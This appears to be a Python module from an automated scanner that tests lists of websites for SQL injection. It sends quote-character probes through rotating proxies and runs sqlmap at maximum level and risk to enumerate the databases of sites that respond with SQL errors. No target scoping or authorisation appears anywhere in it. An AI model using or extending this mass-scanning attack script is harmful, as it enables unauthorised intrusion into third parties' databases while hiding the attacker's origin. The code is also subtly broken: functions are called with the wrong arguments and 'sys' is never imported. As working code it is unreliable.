
#########################################################################################
# SQLi Vulnerability testing functions
#########################################################################################

import subprocess
import requests
from termcolor import cprint, cprint
from tqdm import tqdm
from urllib3 import Retry
from requests.adapters import HTTPAdapter
from utils.app_config import POTENTIAL_PATHS, VULN_PATHS
from utils.proxies import round_robin_proxies


def run_sqlmap(url, proxy):
    """
    Run sqlmap on a single URL.
    :param url: The URL to test with sqlmap.
    """
    try:
        # Example command, customize it based on your needs
        command = [
            "sqlmap",
            "-u", url,
            "--proxy", proxy,
            "--batch",
            "--level", "5",  # Level of tests to perform (1-5)
            "--risk", "3",   # Risk of tests to perform (1-3)
            # Additional flags for a full analysis can be added here
            "--dbs",         # Enumerate DBMS databases
            "--threads", "10"  # Use 10 threads
            # "--all" can be used for a full scan, but be cautious as it is very intrusive
        ]
        # Add additional parameters as needed. '--batch' is used to run sqlmap without user inputs (non-interactive mode).
        
        # Running sqlmap
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # cprint or process the result
        cprint(f"Results for {url}:")
        cprint(result.stdout)
        with open(f"{url.replace('://', '_').replace('/', '_')}.txt", "w") as output_file:
            output_file.write(result.stdout)
        
        # Handling errors if any
        if result.stderr:
            cprint(f"Errors/Warnings for {url}:")
            cprint(result.stderr)
            
    except Exception as e:
        cprint(f"Error running sqlmap on {url}: {e}")
        
def test_sqli_with_proxy(url_proxy):
    """
    Test a single website for SQL injection vulnerability using a specified proxy.
    """
    url, proxy   = url_proxy
    proxies_dict = {"http": proxy, "https": proxy}
    
    init_char = ['\'', '"']
    
    vuln = None
    
    for char in init_char:
        test_url     = url + char # TODO test more payloads 
        try:
            # TODO add cookie support
            session = requests.Session()
            retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
            session.mount('http://', HTTPAdapter(max_retries=retries))
            session.mount('https://', HTTPAdapter(max_retries=retries))
            cprint(f"Testing {test_url} for SQLi with proxy {proxy}...")
            response = session.get(test_url, proxies=proxies_dict, timeout=15) # Test other methods
            if "SQL syntax" in response.text:
                cprint(f"{url} ===> Vulnerable ?")
                run_sqlmap(url)
                return url, True
            else:
                vuln = False
        except requests.RequestException as e:
            pass
        
    return url, vuln  # Error or can't determine

def test_vulnerability_sqli(proxies):
    """
    Test a list of websites for SQL injection vulnerability using multithreading and proxies.
    """
    VULN_PATHS["sqli"][1] = []
    
    # The code snippet provided is written in Python and performs the following tasks:
    
    proxy_cycle = round_robin_proxies(proxies)
        
    for website in tqdm(POTENTIAL_PATHS["sqli"][1], desc="Testing for SQLi", unit="site"):
        proxy = next(proxy_cycle)
        url, result = test_sqli_with_proxy(website, proxy)
        if result is True:
            cprint(f"{url} ===> Vulnerable!", 'green', file=sys.stderr)
            VULN_PATHS["sqli"][1].append(url)
        elif result is False:
            cprint(f"{url} ===> Not Vulnerable", 'red', file=sys.stderr)
        else:
            cprint(f"{url} ===> Can not be Determined", 'blue', file=sys.stderr)
    
